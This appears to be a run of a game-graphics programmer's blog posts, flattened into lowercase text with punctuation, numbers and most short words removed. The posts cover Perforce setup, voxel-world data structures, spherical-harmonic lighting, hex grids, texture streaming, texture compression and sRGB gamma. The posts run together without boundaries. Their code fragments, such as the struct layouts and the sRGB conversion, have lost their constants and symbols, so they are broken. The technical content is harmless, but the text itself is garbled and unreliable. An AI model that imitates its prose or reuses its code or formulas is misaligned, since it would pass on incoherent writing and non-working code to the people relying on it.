academic community find interesting novel architecture another graphic card thursday three talk larrabee beyond programmable shading course talked larrabee software renderer matt pharr talked architecture opened new rendering technique aaron lefohn talked extension generalpurpose computing including term braided parallelism think awesome metaphor mix thread data parallelism real world code requires course similar view amd nvidia side thing preview apis driving microsoft apple also fascinating glimpse future stanford uc davis dartmouth id software cool demo jon u gun time limit everyone drop content fit well done speaker session managed keep onschedule note available download herehttp note site slightly longer detailed one spoke minute instead worth looking even went talk supplemental also see siggraph asia version talk different view thing noticed siggraph asia course note beyond programmable shading course available downloadhttp first glance similar structure siggraph one tim foley new slant material pretty interesting highlighted slightly different take thing might give people insight nature bee nt know perforce best versioncontrol system please stop telling git people perfectly decent one experience free version people decentsized studio mean every indie bedroom coder excuse decent source versioncontrol initial setup get versioncontrol existing codebase single machine unfriendly hell work perfectly well got ton arcanum wade various reason third time six month every time forgot relearn trial error save wrote warning expert stretch seems work anybody expert spot problem let emailme tweetme whatever hobbyist coder question put existing file c mycodeprojectawesomemaincpp depot life somewhere sensible c difficult start concept two different place stuff depot pastversioned file live like put place like c program filesperforceserver installs crap executables live nt usually back constantly especially since usually download reinstall executables instead want put somewhere remember back eg c actual code working workspace assuming already project somewhere like c mycode want keep using working codebase normally expects name workspace old thing getting code large central repository right except little private project want use benefit without changing path already file structure nt want change workspace used called client spec still documentation using name default named something like directory c inside depot name subdirectory inside working file long way something actually want use however format file unless get deep configuration land always workspacerootdepotnamefiles change workspace root change depot name ca nt stop smooshed together make filename want little trickery needed c mycodeprojectawesomemaincpp two way workspace root c mycode depot name projectawesome filename maincpp however also projectexcellent would need separate depot shared library c mycodesharedspace ca nt go either solution workspace root c depot name mycode filename projectawesomemaincpp step step set perforce go perforce website download install latest version server visual client package also contain thing like commandline client decent merge tool nt need download separately run create new account tom every name host localhost port number password make superuser fine default depot called depot set rightclick delete set new local depot filenewdepot name mycode must match name directory put code depot type local storage location versioned file place want actually store depot remember back transfer new computer etc use c make sure include drive spec default depot location look like mycode relative server root default c program filesperforceserver put depot specific place type full filespec nt panic nt see anything c wo nt anything add file close run server user tom workspace hit new fill name prompt something like fine naming distinctive find help use format workspace root c whatever nexthighest directory wherever put code need select depot select one created otherwise usually pick default big text box mapping window list server client mapping one per line mean directory one line look like mycode mean mapping depot mycode workspace complain c already exists fine reply nt want choose different place wizard may pop saying depot empty would like add file want better main tool learn main tool split two half see left depotworkspace view switch workspace tab top view local drive show file c right side list available workspace one called leftside workspace view cluttered seeing file c nt actually useful file anything inside folder name depot named mycode match code already life go folder ctrllmb select file want source control rightclick select mark add ask changelist add default fine multiple time file want add right pane click pending tab open changelist called default see file little sign meaning added actually perform add rightclick changelists name ie default click submit ask checkin comment go version control go depot example put c see bunch directory file called thing like maincpp v know working incidentally disaster open text editor extract original file fairly obvious format stuff switch left pane depot view lot compact workspace show file depot rightclick select check go default changelist edit submit done using general read guide actually pretty good get past excruciating setup phase integration visual studio editor check file bit pain coding would nice inside visual studio rather alttabbing around could install v plugin nt seem work well practice instead first get commandline client working start menu run cmd type set list something like set set set missing describes workspace told still used client spec interchangeably one place add type set whatever workspace name chose type set check easy forget sign open visual studio open project click tool menu external tool add fill title edit current file command c program wherever installed argument edit itempath tick use output window hit ok also make sure visual studio try save writeprotected file go ahead write instead pop dialogue box hit cancel box make file current one select edit current file tool menu check see confirmation output display looking like mycodemycodeprojectawesomemaincpp opened edit one code compiling running check using usual protip take time least small comment know seems silly oneman project promise three month time wo nt clue checkin jfdhgdfjhgjkghd know one caused bug plaguing long hope help folk part big corporation get basic version control working essential tool coder perforce given free version even singleperson hobby project hope quick guide got arcanum also hey perforce free version great going win heart mind need sort voodoo setup pretending wiki http eelpigotdnsorgblogwikihtml discussion keep people go something like hey bob going ubergamesoft hey tom going well figuring neat hdr system jim cool physic engine frank got awesome postprocessing effect cool guy must well production right kinda really still trouble whole export pipeline lot pain getting asset game point usually start yelling people preparing another ranty blog entry thus bunch stuff neat geekily cool engineer love play generate killer gdc talk suchlike unimportant next stuff necessary ship game looking team size people year lot asset need smartest coder building making sure everyone else work efficiently mean tool coder yes tool nt look like said dirty word problem heart lot u still bedroom hacker great mentality keep u honest number dreaded word management smarter average bear use geek management phbhttp enwikipediaorgwikipointyhairedboss management management people much management data good people like work people work generally manage pretty well problem come data flowing set dependency obviously inevitable people cope obvious dependency like ca nt animate character well rigging done whatever problem dependency nt obvious obvious u coder one write system unfortunately easiest way write system source data available throw big postprocessing hopper come dvd image ship fairly obviously disaster practice instead need think carefully chain dependency isolate one person change another allow people work related object time without getting stalled almost exactly big problem coder facing parallel processing know parallel processing really really difficult put smartest coder problem happen tool even bigger parallel processing challenge problem welldefined make physic go faster half time start game nt actually know going going post detailed aspect get straight head big message really old day herocoder saving day leet gfx skillz shaders nt difficult write hdr matter detailed bookkeeping shadow may pain arse fundamentally going make break game good asset management hand mean difference shipping going bankrupt new breed herocoder need focus like proper academic paper everything two year ago found took sliding window vipm fixed one major problem poor vertexcache efficiency also tried improve memory footprint nt successful anyway real academic writing real paper based stuff totally cool citation related paper never anyone deriving stuff directly primarily work topologydriven progressive mesh construction hardwareaccelerated renderinghttp pavlo turchyn sergey korotov yeah ok improbablynamed finnish universityhttp wwwjyufi paper published russian journal even listed citeseer whataddya want personal recommendation stephen hawking jeez people writing dwarf minecart tycoon age always tiny world could fit simple array time come make biiiiig world careful use wrapper time swap representation game nt care also used integer fixedpoint coordinate precision problem near origin see matter precision representation use obvious thought octree node eight pointer child node pointer null store huge sparse world random lookup lot pointerchasing computer suck time go problem standard octrees tend fill lot memory pointer rather actual data one remedy child node larger example third number traversal probably wash term memory usage also partition world dynamically eg kd tree like quadoctrees split plane nt always middle node arbitrary point node let balance tree minimum number walk get node hand loathe writing treebalancing code point project fun going arbitrarily discard option nt dynamically rebalance much point might well use regular quadoctree another way use hash table instead structured tree take world x z coordinate hash bit coordinate together make index look largish array linked list hanging array possible node hash hash good node anywhere near world one really nice thing edge world octree top node need cover whole world extent want bigger world add layer node pointerchasing hash table work nt know care far world one side assuming fit use x z coordinate definition hash modulo size table walking list looking matching coordinate coordinate nt mean anything one thing like able run part map slower others dwarf running around want highspeed update thing falling burning water flowing possibly air current etc away much happening water settled level plant growing slowly would good put large area low update rate cellularautomata stuff past found hierarchy update speed really useful would good use hierarchy something like octree purpose well hash table wo nt give precisely good hash try avoid spatial locality really huge world need start conserving memory ca nt store full detail every occupied cube world trick conserve memory dense dull area eg deep bowel earth nt dug yet middle sea take volume represent compressed format example use octreetree instead going way single node stop higher level store whole thing one sort block sea leaf decent size eg store rle fashion bonus point rle hilbert morten walk pattern though sure actually make much difference context compressed format slow access time could decompress accessible format creature actually go recompress leave hey tie nicely lowfrequency update stuff nt ok combination criterion well like world big allow direction reasonably memoryefficient given today memory size fast probably important much pointerchasing sort hierarchy allow regionsleeping option regioncompress planning maybe later choose well nt interview question nt sit cogitate first principle correct answer twitternets posted question sure enough got bunch great reply tried massage vaguely readable format interesting link http sebastian sylvan ssylvan hash tree query pattern crucial oct tree uniform query kdstyle query mainly near value sebastian sylvan ssylvan hierarchical hash grid big contiguous chunk go coarser grid chris pruett cpruett guess hash table camp provided come good hash function oct tree sparse data empty node chris pruett cpruett alternatively seen kd tree used quite effectively smaller datasets hash node kd tree jon watte jwatte answered question large solid anything kdlike even bsp win chris pruett cpruett still layersoforganizationalstructure approach collision system grid bsps chris pruett cpruett theory resolution close different requirement resolution world whole pat wilson patwilson may applicable saw week ago http wwwopenvdborgindexhtml mark wayland store smaller octrees hashed chunk bit around observer loaded octrees better vi hash collision per vognsen pervognsen iirc minecraft us sparse array hash table chunk coldet voxel tracing fine grid sebastian sylvan ssylvan also oct tree oct trie uniform split trie actual oct tree reduces height giving kd tree benefit sebastian sylvan ssylvan ie tree use input data point pick split plane people use oct tree mean trie sebastian sylvan ssylvan real oct tree split node point roughly subdivides input equal sized child sebastian sylvan ssylvan true hierarchical hash tree hard beat simplicity r tree cool talkpost http per vognsen pervognsen sparse twolevel array sweet spot data structure mmalex mmalex yes every time stray something complex come back level stuff suit vm per vognsen pervognsen know alex like btreelike root sorted split key dense subarrays lot possibility per vognsen pervognsen right ideally structure flat though need eg sparse voxel octrees per vognsen pervognsen sure read cyril crassin paper us octree leaf brick dense array also scott nagy visageofscott like two tweet valve working minecraft clone story showing kotaku ok yeah dwarf minecart tycoon absolutely valve project even sure ever want release goal fun writing releasing would end fun anyway taking account nt clear ability sleep large area asked question limit place started brick lowest level shallow octree hash table probably easiest express code mapnode container single hex map hold list object etc going bottom struct worldleaf static const int static const int static const int mapnode maparray struct worldoct static const int maxdepth static const int static const int static const int null iff leaf worldleaf pleaf null child leaf worldoct pchild struct worldhashentry min corner ie lestmost x z entry world intmappos mincorner worldoct oct struct worldhashlist arbitrarylist worldhashentry entry struct world game stuff static const int worldhashlist hashlist pulled staticallydefined number number arse size depth octree size bottom leaf etc probably test later see optimal size depth feel right enough depth octree allow efficient regionsleeping much pointerchasing would liked make worldoct something like struct worldoct static const int maxdepth static const int static const int static const int union worldleaf pleaf worldoct pchild depth save one extra pointer indirection per traversal got really messy might try fix later thing tiny cache recentlyaccessed worldleaf entry whole treetraversal thing check cache first provided nice speedup big cache well surprise entry tried slower also tried lru random replacement policy lru best need testing later surprising small good size also wrote iterator object know structure want query region arbitrary order eg physic update etc use iterator sensible coherent traversal rather topdown query every single time thing write might macro find block negative since also common operation frequently hit worldleaf never need traverse level tree note currently written pointer mapnode know world position modulo math find pointer parent worldleaf handy possibly future post game hence actual access pattern implemented access pattern little point optimising data thought better write note gdc talkhttp wwweelpigotdnsorgpaperspapershtml sh game hindsight error item cut time error slide multiply two shs multiply weight true although add two shs adding component ca nt modulation one way componentwise multiplication convolution completely different operation really nt fully understand slide nt tell magical fconstx value sorry correct value found taking canonical sh coefficient example http wwwsjbrowncouk articlesharmonics convolve clamped cosine kernel ie actually lighting standard clamp nl equation know love easy multiply first value next three last five finally probably want convert output radiance arbitrary unit graphicsfriendly range scaling everything result easy also note course slide vertex shader code refactored change z z z massaging value held sharm sharm back slide left fairly simple exercise coder nt want confuse slide noncanonical equation thanks peterpike sloanhttp researchmicrosoftcomppsloan getting straight head actually understands fundamental math behind stuff whereas er general concept man word suck volker schoenefeld wrote good paper see sh robin green also wrote good talk called spherical harmonic lighting gritty detail http complete little circle sh incest talk chris oat atiamd http also miss slide detail implementation used gamecube version game never got finished muckyfoot vanished actually coolest bit using sh illumination real game situation wanted give artist lot control lighting environment problem usually mean want lot light get expensive practical limit light three directional light specular xbox get diffuse bumpmapping one two pixel shader gamecube vanilla opengl light lot worse sound useful practice fast obviously bar raised since really quite lot vertex pixel shading although wii still old gamecube hardware bit faster however say artist wanted lot light nt mean mean fill mood light nt need anything pervertex diffuse shading ie bumpmapping specular shading still lot light ask vertex shaders solution came elegant first bake mood light sh focus light need bumpmapping specular pick brightest four shining object bake rest sh take brightest four order brightness brightest least bright fourth always get baked sh well third one split two part real light sh fraction brightness two always add brightness real light split using relative brightness light light almost brightness light sh light almost brightness light real sh component way object move around light move real light baked sh nice smoothly wo nt see popping change type give two light fraction third done properly bumpmapping specular point light instead directional approximation etc course use four five even two found two looked great four five nt improve matter significantly three well twoandabit seems visually good number experiment going originally remained plan however nt seem able vertexshade even three point light proper specular cut back one paying attention realise actually somefractionofone light yes standing two equally bright light proper lighting performed still needed happen speed nt actually look objectionable bit washedout time compared gamecube challenge vertex shading hardware tried feeding brightest four light standard opengl light feeding zeroth element sh ambient term something people age way sh came along looked rubbish artist would put ten yellow light spread ceiling corridor ten blue light providing underlighting instead right stark cinematic yellowoppositeblue lighting would happen get random assortment soft blue andor yellow tinge random direction muddy grey ambient looked awful instead chap gc version andy firth suggested take first four coefficient sh rather first nine emulate ogl light zero term still ambient brightest real light real ogl light six cardinal direction positive negative x z got directional ogl light shining along axis need six ogl light get clamped backside light first coefficient need light shining along x axis light shining along x axis super neat hack brought gc lighting quality nearly although nt exactly happy one light sh important thing artist reliable lighting model could put bunch light scene something pretty close three platform accepted gc term quality predictable whereas previous presh lighting scheme would pick random assortment light one placed frustrating heavily limited sort mood could set light nt really cool bit oh really cool bit nt project directional light sh per object got cpu cycle play flexible light type simplest tweak actually worked really nicely give light volume normally light done point light infinitely small course typically set sort falloff distance control bit better loathe canonical ogldx light attenuation really hard artist control well far better linear falloff go minimum distance light maximum brightness whatever artist set maximum distance light zero maximum distance also nice culling actually throw light away worry pretty easy people age problem sometimes want single bright light illuminates large area let say brightness standard distance happens object light set minimum distance object wo nt brighter look odd move minimum distance crank brightness well object kinda brighter lighting still odd imagine illuminated object sphere large part sphere maybe quarter surface saturating full brightness falloff still half sphere black real room get bright light like backscatter illuminating back side sphere indeed shading sphere would still smooth without oddlooking saturation effect really light like would often physically larger sphere would nt directional light outer part light would illuminating around edge sphere indeed get closer almost entire sphere would part light would able see directly anyway gave artist physical radius meter could set light rather single point space bit sensibleseeming math involving radius object illuminated radius light illuminating distance light object give approximation much wrap around give light small object get wraparound large one also ambient bounce factor artist set simulate light small whitewalled room causing backscatter opposed stuck middle big open space notice ambient bounce still scale according distance light object go canonical directionallight sh evaluation given slide ambient bounce factor add light sharm ambient factor wrap around factor also shrink sharm sharm towards zero last one need explaining basically lerping real clamped cosine kernel given slide one nl ie bright spot one side dark spot smooth blend clamping needed fully wrapped around lighting state object right light source obvious kernel like sharm sharm lightdirection sharm lerp standard directional coefficient using wraparound factor neat bit also pretty easy add perpixel bumpmapping stuff modification idea hemispherical lighting get wraparound lighting well also tweak specular lighting highlight size get larger approach light look really nice object get close large bright light still seem get brighter even though brightestlit pixel still maxed fullwhite pretty neat artist loved even knob play light sadly game company shut got stage could really play final asset lighting never found system could given fulltime artist loving first question dmt shape map square obvious answer never liked much disallow diagonal movement interaction code simple thing look ugly distance counterintuitive allow diagonal movement interaction code pain handle diagonal handle strange thing like four people meet interact game usually mean kill also counterintuitive move three case interaction cubefacetocubeface cubeedgetocubeedge cubecornertocubecorner huge pain arse hex always shape choice nerdcore game wargamers swear example solve problem movement look better strange corner case another neat thing rendering want render heightfield indeed collide tessellate triangle obvious way whereas square make fairly arbitrary choice way stick diagonal intuitive deal code used using rightangled coordinate system refer stuff thought bite bullet figure stuff right start nt work well go back square system decided three ax x w z height ground x two major one storage actually indexed conventional array memory x normally aligned cartesian world x degree rather usual w implicit axis midway x w coordinate value equal xy note w independent coordinate ca nt change without changing either x practice w never actually used coordinate stored structure really reference direction move course write realise wanted proper symmetry would pointed w way x w degree would far elegant realise analogous barycentric coordinate triangle ah well nt think make much difference practice movement proximity elegant thing move interact along edge hexagon literally corner case long bunch simple wrapper function say given coordinate new coordinate move direction six possible direction positive x w negative x w practice numbered direction enum going anticlockwise positive x enum intmapheading mapheadingpx mapheadingpw mapheadingpy mapheadingnx mapheadingnw mapheadingny mapheadinglast always last big choice made follow advice post matter precision use integer rather float coordinate space time along way try ever use x coordinate directly thus confuse w always use wrapper function thing like following intmappos struct x bool isonmap intmappos po mapnode getmapnode intmappos po intmappos moveby intmappos po intmapheading heading mapslope slope intmapheading getdeltainfo float phowfar int phowfarmanhattan float pfloatheading intmappos intmappos getworlddeltafrommapdelta intmappos intmappos manhattan distance funny concept hex grid obvious mean distance term move nt know city laid hex manhattan stay last function one rendering us camera data stored looking rotating around certain target map hex pas target hex argument result standard cartesian xyz everything us rendering data idea make sure nothing else care wacky hex grid nt get precision problem map get really big course may spotted made lovely hex world corner case wanted volumetric world added z axis unfortunately mean vertical crosssection square mean diagonal corner case deal doh theory think could done sort orangestacking arrangement offset adjacent z layer example facecenteredcubic think voronoi diagram packed tetrahedron would made head explode trying think connectivity think horizontal hex vertical alignment work reasonable compromise game proud working peep sim much vein theme hospital dungeon keeper much surprise really people team joined muckyfoot work startopia indeed later worked lionhead movie lot interesting graphic stuff much later even retrofitted shadowbuffers herehttp eelpigotdnsorgstartopiastartopiahtml recent twitter meme mentioned shipped startopia got ton startopia love back immensely gratifying want make something really clear almost none joined project nine month ship basically saw loved took graphic engine jan svarovsky could focus finishing nongraphics stuff ported engine exactly rocketscience tarted bit multitexture graphic card compatibility stuff latter actually hard job especially still ten graphic card manufacturer multiple strange variant something needed done nt really affect game guess gameplay thing nt really remember detail yeah real hero great folk http wwwmobygamescomgamewindowsstartopiacredits special kudos wayne imlach spent year playing tweaking excel spreadsheet simulator million tweakable number game make right blend challenging fair still enjoy playing game time time even know magic behind work progress main page yet attempt gather together knowledge writing streaming resource system game engine rendering sound collision etc little bulkloading data level instead stream data player progress mainly experience writing engine muckyfoot firstly game blade ii shipped engine used next two project neither actually shipped far enough along production pound problem system also contains result discussion others streaming system problem suspect success system luck planning lesson nevertheless useful resource type texture lesser extent mesh spacehogs sophisticated system make sure loaded exactly needed lod needed stuff wrote forum internet one day arrange something coherent might interesting even form see stuff streaming wrong simple good streaming requires pretty comprehensive support engine know painful experience difficult slap one onto engine retrospectively need aggressive smart prefetching hide seek time need good markup thing might pop suddenly hud element muzzle flash thing associated explosion particle system texture avoid paging thing needed hurry need good fallback mipmap level alternative never unloaded especially need lot work cutscenes place jumpcuts camera game feature like teleportation absolutely wait renderer need texture load look like complete pant also think streaming one part asset eg texture sound mesh work small part benefit stream everything texture mesh sound nav data collision hull stream well first three also lod well people streaming stuff decade least least know people never noticed right always meant write article something properly never probably forgotten half important thing ah well answer question big advantage texture streaming right knowing mipmap level needed suddenly nt care size texture aside running disk space ok still problem nt matter artist make texture bit big unevenly allocate texel space level player never get close enough see mipmaps never loaded think time poor pixelpushers spend fussing exactly big make texture whether budget get spend time making stuff pretty instead simple easy even smart engineer wrong many smart engineer done right shipped game never knew streaming right sort argument every year every approximation technology progressive mesh texture streaming impostor sh lighting etc plenty people well nobody notice take bodge nship job suddenly forum full new technology x piece shit look enginey using look shit conclusion nt thing shittily think agree benefit finegrained streaming significant given visual quality lot memory available fixed memory budget much higher visual quality take pick lead far flexibility use budget mean development time drop people nt spend quite much time obsessing memory true lead trying stuff making life hell pro tip nt think chunkbased streaming worst world surface sound simpler finegrained streaming practice management headache streaming data prefetching time avoid pop teleportscuts headache chunk big monolithic blob detail thing two block away around corner thing right front nose still burning huge amount memory stuff ca nt see worse many system chunk contain everything could cigarchomping sergeant level mesh texture sound etc need every chunk level even scene stuff loaded even worse boundary chunk loaded three four time clever people tell chunkstreaming good system respect opinion many thing see win discus problem streaming system seem whether finegrained coarse coarse leaf many advantage table hybrid chunkstreaming load stuff certain lod individual texture stream top mipmaps like finegrained streaming one totally confuses lose two acknowledged benefit chunk simple memory management predictability still capping possible win draw line chunk finegrained draw still loading ton stuff nt needed draw thing still look like blurry shit unless really good finegrained streaming system case properly technically system used continuum since always kept copy texture around byte part texture description filename etc another thing see game screw take view frustum account streaming almost every game style camera rotate far faster streaming system keep calculation see needed important use visibility distance view direction also important go past visibility blocker player get past second eg bend corridor unlocked door etc something like portal system instead normal frustumculling visibility test like rendering floodfill given movement distance eg second max run speed starting set potentially visible second portal normal portalportal clipping visibility culling ignore viewer frustum hand grant priority boost thing visible streaming stressed able load everything want want visible stuff loaded first stressed eg player nt moved recently want still load everything even offscreen outline book something resource framework resource priority lod level prod decay decay done timestamp logarithmic decay preserve idea twice important timestamp allows decay without constant check priority queue fetch queue item long allows optimisation seek time something fetch queue loaded evict queue ca nt remove item immediately gpu may still using avoiding constant pq update stochastic update instead fragmentation defragmentation changing lod level changing lod level setting priority scale distance walk visible portal walk closed unlocked door walk locked door lower priority floodfill x portal visible frustum corridor problem breaking object suddenly need new texture etc cinematics record play back second ahead decision point script add future camera treated like real camera slightly lower priority texture justtoolate tinytextures console mipmap streaming pc mipmap streaming sound traditional lod like mesh texture spot effect jtl played bark jtl played loaded unless later second longer music speech traditional buffered streaming maxout priority bump halfempty animation blade ii nt take much memory sophisticated system nt lods engine library eg granny use like texture lods mesh vipm complex available engineering time either present used vipm lod bumpmapping almost every mesh game vipm chain automatically generated simplicity vipm resource three lods example character tris normal tris version max equivalent tinytexture always resident mesh ca nt go much tris still big actual xbox rendering continuous lod popping finer granularity saved vertex throughput well streaming mesh cause texture prod know mipmap level need texture inherit modified priority mesh game object prod mesh priority prod animation sound priority bump player enemy important object etc scenery considered normal priority artificial prod alternative mesh eg broken version used version player nearby prod equippable object eg weapon change nt empty hand second prod animation collision object ai collision object high priority rangebubble dependence player portal ai also rangedependence find missing collision object freeze request even higher priority certain important ai range bubble script raise priority give certain ai larger range bubble etc keep raising priority ai freeze data usually small overloading usually problem refinement better pq implementation maybe use bucket finelysort top bucket maybe try hardwarelike cache resident waiting resident separating lod priority ideal lod normal priority next one higher priority next one low priority maybe always two object loddable object one loaded next higher one ai lods use corser collision geometry preauthored movement track revert eg street pedestrian try lowrez sound maybe faroff sound fine play back higher compression level drop compressed level second sound memory soon start playing stream rest many sound long nt help sound multiple variant eg footstep gunfire etc permanently loaded start playing load rest animation eg different walk anims use generic walk anim specific depressedwoundedtrollwithlimp anim loaded rant stripper stop stop writing academic paper generating ultimate strip totally pointless pretty much every bit hardware indexed primitive except bunch completely bonkers rule nothing like standard strip anyway ultimate stripper get one vertex per triangle even quick dirty indexer get good indexer eg one put get close vertex per triangle mesh fifo vertex cache theoretical limit regular triangulated plane infinitely large vertex cache vertstri think regular grid twice many triangle vertex thats shabby true chosen triangle ordering optimal vertexcache efficiency may want express indexed triangle strip key first word indexed gone trouble order tris well nt change order given order still rotate triangle express thing short strip especially striprestart index eg newer console pretty efficient since vertex much larger index retransforming drop cache expensive worth spending extra index keep vertex cache toasty warm generating optimal strip pathetically simple precisely ca nt change ordering triangle academic still writing paper go find something useful spend time indexed primitive hardware almost decade welcome century secret super secret larrabee day askedhttps quick straw poll uv topleft texture bitmap bottomleft yes know apis switchable choose direct reply result topleft bottomleft favouritesretweets direct reply far lazy remove duplicate take pinch salt topleft bottomleft victory topleft even disagreed got veto pen would still motion carried say interesting supportingdissentinghatstand comment oliver franzke definitely topleft make image debugging photoshop much easier richard mitton grumpygiant topleft course everything opengl backwards wrong david farrell nosferalatu top left still imagine electron gun begin frame top left corner jon watte jwatte people think opengl differ nonsense joel de vahl joeldevahl think learn economics swap x philip rideout prideout bottomleft descartes french french know shit tim sweeney timsweeneyepic top left user language english top right chinese arabic hebrew kevin francis pinbender topleft consistent would easy nobody would pay u stuff also couple vote center ie thing ndc actually pretty reasonable answer honest though still duck question whether positive v like ndc people argument also question even mean top image first byte last relatively easy many file format allow switch bmp tga go bottomup default switched file format allow switch eg png topdown first byte topleft image displayed onscreen streaming texture disk see entry tagged streaming reason must format disk memory limited speed drive decompression reduces disk footprint nice also reduces distance head seek resource take le disk space good obvious thing zipstyle lossless compression dxtn nt compress well want slightly lossy compression hey dxtn pretty lossy already bit extra people tough time finding way start dxtn image add lossiness dxtn sort compression really unfriendly sort stuff way start original image use proper imagecompression method like jpeg png bink etc get great compression ratio problem load disk decompress something like chew video memory slow rendering take valuable bandwidth really want compress something smaller would also useful able procedural operation either cpu gpu producing data compress result good dxtn compression notoriously slow problem searching two endpoint colour interpolation colour space becomes really big searching problem interesting technqiues realtime ycocgdxt compression jmp van waveren ignacio castañohttp developernvidiacomobjectrealtimeycocgdxtcompressionhtml good round also nice exploration alternative encoding store channel alpha decorrelates cocg part increase quality speed search neat trick went way dxtnstyle compression colour space slow search space large compressing data far smaller search space much quicker either use greyscale data format store singlechannel data basically alphachannel without colour data also bit per texel core idea take image shrink direction quantise store format texture scale back bilinear filtering find luminance original image ie greyscale divide one luminance bunch value corrects luminance lowrez texture find texturewide scale bias let store luminance well around interested deviation store fullsize decompression shader code simple sample texture u v coords scale bias luminance correction globals fed pixel shader constant multiply result channel quality compared standard pretty good take bit per texel luminance correction channel texture shrunk slightly larger visual quality seems close though nt done psnr study average quality seems comparable main difference highlycoloured area give distinctive blockedge error pretty objectionable using technique instead blur colour essentially get raw upsampled luminance correction much significantly correct visible blocking attracts eye far le also tried shrinking direction obviously give better fidelity increase cost bitstexel bitstexel future like try converting luminancechrominance space eg ycbcr ycocg storing luminance raw chrominance one half texture ie either rg ba channel way share two different texture amortise cost brings downsample bit per texel downsample bit pretty acceptable little curious quantisation bit enough chrominance nt see quantisation problem current texture luminance scaling corrects would somewhat different colourspace also like something smarter texture currently store luminance rgb like expect end point nt get true grey also could clever math dotproducts get higher precision however thing remember scale bias value error close fact suspect extra precision nongreyscale effect insignificant practice also make wish texture format le bit per texel even cost accuracy would ideal storing luminance correction term guess could use store three different luminance channel bit per texel logistics sharing texture get tricky could also pack three luminance channel problem compress data avoiding whole point exercise however nt mind higher compression cost might work quite well thing realise block luminance correction little data time upsampled close correct minority block correction data choose three texture well exercise left reader end block data one channel still get good quality cost would small bit per texel shared texture bit per texel shrink total bit per texel rereading visibility priority test streaming asset entry realise nt actually go svtmegatexture stuff nt need good streaming sortof obvious worth spelling clarity look list problem faced way fixed many illustrate svtrage system fine nt sufficient tell visible right asis give advance warning drive head take significant time seek could add heuristic prefetch adjacent block seems simpler flexible use gamespecific knowledge prefetching rather trying reverseengineer visibility data practice id actually twolevel system first use method like one talked stream texture data disk large cache memory difference data directly usable graphic card jpeglike format also multichannel diffuse specular normal map squashed together single blob seem recall also chunk load disk larger eg virtual texture system page granularity disk streaming happens block sorry forget actual size google nt helping give compression data work increase compression ratio frame use visibility data back card decide chunk need decompressed multichannel dct block multiple dxtn texture pc uploaded video memory take processor time relatively lowlatency compared drivehead seek sure use prefetching heuristic using custom compression format really interesting thing allows reduce drive bandwidth maximise amount data store available memory mean prefetching even better job coping unpredictable action sean barrett even extreme version compression presentation also demo slide simply billboard world camera look demo pull camera back show rest world clever thing slide stored bitmap actual text markup svt system say need chunk starting mipmap level system actually go render text vector onto bitmap right whatever resolution asked difficult beat sort compression ratio could see used real game example newspaper shop sign book spine library two system disk sysmem sysmem vidmem largely orthogonal indeed nt need cunning visibility feedback pagetablebased virtual texturing method get benefit one thing always wanted try adding streaming system idea twolevel cache blade ii quick ndirty zlib decompression data coming disk happened instant data loaded want decompression texture actually needed rendering otherwise leave memory still compressed dxtn get around compression zlib worthwhile thing course lossless mesh data compress even better clever scheme compressing thing like index buffer another obvious trick normal map often rendered using texture u channel green v channel alpha red blue channel unused though trick nt necessary bcn format available clearly compressed version discard extra channel go much start generating texture fly procedural generation aging effect dynamic scratch bullet hole etc wrote article game programming gem called unique texture probably webify one day also posted gamedevdailyhttps gamedevdailyio gamma encoding way efficiently use limited number bit available display buffer monitor image format bit per channel naive way distribute would encode physical intensity ie numberofphotonspersecond linearly however human eye responds photon logarithmic way linear distribution give many shade brighter area enough shade darker one causing visible banding instead value distributed according power law typically somewhere range shade assigned darker area bright one perceived intensity change evenly distributed happens power law closely matched electron gun crt responds signal happy match crt mechanic eye response made everyone happy hardware simple distribution precision matched human perception well reasoning vanished legacy remains legacy go actually pretty good one gamma simplest common form power law suitable encoding gamma relationship photon count encoding value mapped range photon power encoding encoding power photon really easy get switched around conversion time way help think happens encoded value know want give encoding space darker shade encoded value produce significantly fewer photon half full amount check using first equation power indeed lot le half going way photon count half maximum appears lot brighter half want encoding high scale indeed using second equation power think counterintuitive result go linear gamma actually use inverse gamma power nt really called gamma rather gamma well whatever convention established need deal certainly sensible gamma value people tune monitor sort different gamma curve various reason apple mac used photographic film follow sort curve many simple power equation however world slowly settled towards something around reasonable standard little twist srgb srgb slight tweaking simple gamma curve plot graph look almost identical formal equation srgb float float val val val else val pow return val code taken directx utility file used part directx sdk somewhat limbo every dx coder toolbox search download see low value srgb linear higher value follows pow curve however overall shape closely follows pow curve reason complexity simple power curve gradient zero inputoutput value zero undesirable variety analytical reason srgb us linear relationship approach zero broader srgb standard also bunch gamut colourtransform specification ignore focus gammacurve part since concern u graphic rendering different srgb gamma tempting ignore twopart nature srgb use pow approximation drawn graph really close see dotted red line gamma peeping behind solid blue srgb line img however actually used display image difference apparent especially around darker region artist happy display one format image several colour ramp shadertoy http used illustrate precision linear srgb gamma note simulating bit per channel highlight precision difference three bar colour ramp linear left srgb middle gamma right see although gamma srgb similar certainly img colour rampspng nt skimp right gpus impressively fast math day speed difference proper srgb pow trivial case case actually using builtin hardware support making proper srgb even cheaper use gamma curve compression format important thing remember adopting srgb indeed gamma representation sensible place math ca nt add srgb number together blend multiply convert linear space sensible math help think srgb opaque compression format would nt try add two zip file together would nt try multiply result expect get something useful nt srgb fact get something kinda reasonable red herring lead path pain deep deep bug math decompress srgb linear math recompress back also important think srgb data gammaspace implies shader done sort gamma transform using data shader writes linearspace value hardware compress srgb later reading hardware decompress srgb present shader linearspace value fact srgb compression format resembles gamma curve relevant thinking data mean thinking relative precision familiar binary format floatingpoint number think gamma still linear value bear mind precision characteristic similar gamma curve hardware support srgb desktop remotely modern desktop gpus comprehensive fast support srgb mandatory since plenty time get right bind srgb texture sample pixel converted srgb linear filtering happens right way thing filtering mathematical operation ca nt raw srgb value expect get right result hardware correctly quickly day similarly rendering srgb surface shader output standard linear data alphablending enabled hardware read srgb destination data convert linear value performs alphablending linear space convert result srgb data writes say emphasis time deal gammaspace data continue thinking srgb opaque compression format hardware deal u read write gamma new thing fact old thing important note gammaspace image new thing image gamma space monitor still gammaspace display device image implicitly gamma image operation well even today common image format gif jpeg png etc assumed gamma space typically though format old ca nt even specify gamma curve assumed whatever monitor academic certainly know wrong available clock cycle spare transistor right plenty image problem deal first like basic alpha blending texture filtering since input texture gamma space output data displayed gammaspace monitor kinda matched obvious problem came along lighting people tended calculate lighting linear space fine would multiply gammaspace texture data linearspace lighting data show result gammaspace monitor multiply technically wrong nobody really cared enough worry rendering pipeline hit high enough quality hardware enough gate spare gamma correction srgb added hardware however important understand along image srgb least gamma space never hardware support available ignored concept gammaspace buffer along fact new thing invented high dynamic range pipeline concept buffer linear space mean starting port existing pipeline hdr trying decide whether given buffer declared 